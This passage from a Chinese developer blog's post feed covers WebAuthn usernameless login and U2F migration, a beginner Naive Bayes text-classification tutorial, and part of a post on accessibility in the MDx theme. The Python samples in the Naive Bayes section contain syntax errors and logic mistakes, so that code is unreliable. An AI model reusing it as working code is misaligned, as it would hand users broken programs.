找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" 